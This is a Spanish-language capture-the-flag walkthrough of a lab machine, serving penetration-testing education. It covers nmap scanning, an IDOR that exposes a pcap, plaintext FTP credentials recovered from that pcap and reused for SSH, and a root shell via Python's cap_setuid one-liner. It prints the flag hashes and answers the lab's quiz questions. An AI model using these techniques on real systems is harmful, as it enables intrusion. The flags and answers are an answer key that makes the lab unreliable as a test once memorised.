## 1. Reconocimiento de Puertos con Nmap

Iniciamos la auditoría verificando la conectividad con la máquina objetivo mediante un `ping` y procedemos a realizar un escaneo exhaustivo de puertos y servicios utilizando `nmap`.

```Bash
ping -c 4 <IP>
nmap -sC -sV -O -Pn <IP>
```

**Servicios Identificados:**

|**PUERTO**|**SERVICIO**|**VERSIÓN**|
|---|---|---|
|21/tcp|ftp|vsftpd 3.0.3|
|22/tcp|ssh|OpenSSH 8.2p1 Ubuntu 4ubuntu0.2|
|80/tcp|http|Gunicorn|

Los resultados muestran un servidor web en el puerto 80, así como servicios FTP y SSH que podrían servir como vectores de entrada si obtenemos credenciales válidas.

## 2. Enumeración Web y Descubrimiento de IDOR

Accedemos a la aplicación web a través del puerto 80. La página principal nos presenta un panel de control (Dashboard) donde identificamos un posible nombre de usuario en la interfaz: **Nathan**.

### 2.1. Explotación de IDOR (Insecure Direct Object Reference)

Navegando por la aplicación, accedemos a la sección "Security Snapshot", la cual genera capturas de tráfico de red. Observamos que la URL sigue un patrón predecible y secuencial:

`http://<IP>/data/1`

Esto sugiere una posible vulnerabilidad de **IDOR** (Referencias Directas Inseguras a Objetos). Para comprobar si la aplicación valida correctamente los controles de acceso, manipulamos el identificador de la URL, cambiándolo de `1` a `0`:

`http://<IP>/data/0`

La petición es exitosa y nos permite descargar un archivo de captura de tráfico antiguo (`.pcap`) que contiene datos de la red correspondientes al directorio de subidas.

## 3. Análisis Forense (PCAP) y Acceso Inicial

### 3.1. Análisis del Tráfico con Wireshark

Abrimos el archivo `.pcap` descargado utilizando Wireshark para analizar los paquetes de red. Dado que el protocolo FTP transmite la información en texto plano (sin cifrar), podemos inspeccionar el flujo TCP de la conexión.

Al examinar los paquetes, localizamos un inicio de sesión FTP exitoso donde se exponen las credenciales en claro:

- **Usuario:** `nathan`
- **Contraseña:** `Buck3tH4TF0RM3!`

### 3.2. Acceso FTP y SSH

Con estas credenciales, nos conectamos al servicio FTP para explorar el sistema de archivos del usuario.

```Bash
ftp <IP>
# Usuario: nathan
# Contraseña: Buck3tH4TF0RM3!
```

Dentro del servidor FTP, encontramos y descargamos el archivo `user.txt`, obteniendo la primera bandera (flag) del usuario:

`5f63f6a16414f7e467ad0daa1abda0aa`

Sabiendo que la reutilización de contraseñas es una mala práctica común, probamos estas mismas credenciales para acceder al sistema a través del servicio SSH:

```Bash
ssh nathan@<IP>
# Contraseña: Buck3tH4TF0RM3!
```

La autenticación es exitosa, otorgándonos acceso interactivo (shell) al servidor como el usuario `nathan`.

## 4. Escalada de Privilegios

El objetivo final es elevar nuestros privilegios a `root`. Para ello, iniciamos la fase de enumeración del sistema local.

### 4.1. Enumeración de Linux Capabilities

En lugar de limitarnos a buscar binarios SUID convencionales, revisamos las "Capabilities" de Linux (privilegios granulares asignados a ejecutables) utilizando el comando `getcap`:

```Bash
getcap -r / 2>/dev/null
```

**Resultados Clave:**

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

El hallazgo crítico es `/usr/bin/python3.8`, el cual tiene asignada la capability **`cap_setuid`**. Esto permite que el binario manipule los identificadores de usuario (UIDs) del proceso, otorgando la capacidad de ejecutar código con privilegios de superusuario (`root`).

### 4.2. Explotación de `cap_setuid` en Python

Para abusar de esta configuración errónea, ejecutamos un _one-liner_ en Python. El script importará la librería `os`, cambiará nuestro UID actual a `0` (root) utilizando `os.setuid(0)`, y finalmente lanzará una shell (`/bin/sh`):

```Bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

Comprobamos nuestra identidad para confirmar la escalada de privilegios:

```Bash
whoami
# root
```

Finalmente, leemos la bandera de administrador:

```Bash
cat /root/root.txt
# cc6059d3d0af399142f4239a6ee1ccd6
```


---

>[!Question]- ¿Cuántos puertos TCP están abiertos?
>3

>[!Question]- Después de ejecutar una "Instantánea de seguridad", el navegador se redirige a una ruta con el formato `/[something]/[id]`, donde `[id]`representa el número de identificación del escaneo. ¿Qué es el `[something]`?
>data

>[!Question]- ¿Puedes acceder a los escaneos de otros usuarios?
>yes

>[!Question]- ¿Cuál es el ID del archivo PCAP que contiene datos confidenciales?
>0

>[!Question]- ¿En qué protocolo de la capa de aplicación del archivo pcap se pueden encontrar los datos confidenciales?
>ftp

>[!Question]- Hemos conseguido obtener la contraseña FTP de Nathan. ¿En qué otro servicio funciona esta contraseña?
>ssh

